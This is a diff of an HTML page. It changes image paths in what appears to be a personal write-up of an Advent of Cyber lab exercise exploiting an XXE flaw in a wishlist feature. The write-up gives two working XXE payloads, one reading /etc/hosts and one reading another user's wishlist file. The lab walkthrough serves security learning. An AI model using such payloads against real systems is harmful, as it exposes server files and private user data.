@@ -8,7 +8,7 @@
   </head>
 
   <body>
-    <article><div><h1>(Day 5) - Advent of Cyber</h1><p>Target IP - 10.10.89.163</p><h2>Website</h2><p>There is an XXE vulnerability present in the website we can see this by navigating to the website and using BurpSuite to analyse the requests:</p><p><img src="/images/Pasted image 20241206231318.png" alt="Pasted image 20241206231318.png"></img></p><p>Here we see a post request captures from adding an item to a wishlist, let's see if we can exploit this xml, we will try to exploit it using this payload:</p><pre><code><!--?xml version="1.0" ?-->
+    <article><div><h1>(Day 5) - Advent of Cyber</h1><p>Target IP - 10.10.89.163</p><h2>Website</h2><p>There is an XXE vulnerability present in the website we can see this by navigating to the website and using BurpSuite to analyse the requests:</p><p><img src="/static-site-generator/images/Pasted image 20241206231318.png" alt="Pasted image 20241206231318.png"></img></p><p>Here we see a post request captures from adding an item to a wishlist, let's see if we can exploit this xml, we will try to exploit it using this payload:</p><pre><code><!--?xml version="1.0" ?-->
 <!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
 <wishlist>
   <user_id>1</user_id>
@@ -16,7 +16,7 @@
        <product_id>&payload;</product_id>
      </item>
 </wishlist>
-</code></pre><p>There we receive this, confirming that an xxe vulnerability is present here:</p><p><img src="/images/Pasted image 20241206232624.png" alt="Pasted image 20241206232624.png"></img></p><p>So now we are able to change our payload to this, trying to see if we are able to see the wishlist's that we weren't able to access previously:</p><pre><code><!--?xml version="1.0" ?-->
+</code></pre><p>There we receive this, confirming that an xxe vulnerability is present here:</p><p><img src="/static-site-generator/images/Pasted image 20241206232624.png" alt="Pasted image 20241206232624.png"></img></p><p>So now we are able to change our payload to this, trying to see if we are able to see the wishlist's that we weren't able to access previously:</p><pre><code><!--?xml version="1.0" ?-->
 <!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
 <wishlist>
 	<user_id>1</user_id>
@@ -24,7 +24,7 @@
 	       <product_id>&payload;</product_id>
 	</item>
 </wishlist>
-</code></pre><p>There we receive this response, we will continue to iterate until we find the flag:</p><p><img src="/images/Pasted image 20241206233308.png" alt="Pasted image 20241206233308.png"></img></p><p>We were also told of a changelog so we decided to move to it, and we see that Mayor Malware has pushed a change after Software.</p><p><img src="/images/Pasted image 20241206235010.png" alt="Pasted image 20241206235010.png"></img></p></div></article>
+</code></pre><p>There we receive this response, we will continue to iterate until we find the flag:</p><p><img src="/static-site-generator/images/Pasted image 20241206233308.png" alt="Pasted image 20241206233308.png"></img></p><p>We were also told of a changelog so we decided to move to it, and we see that Mayor Malware has pushed a change after Software.</p><p><img src="/static-site-generator/images/Pasted image 20241206235010.png" alt="Pasted image 20241206235010.png"></img></p></div></article>
     <a href="/">Back to Home</a>
   </body>
   <hr>
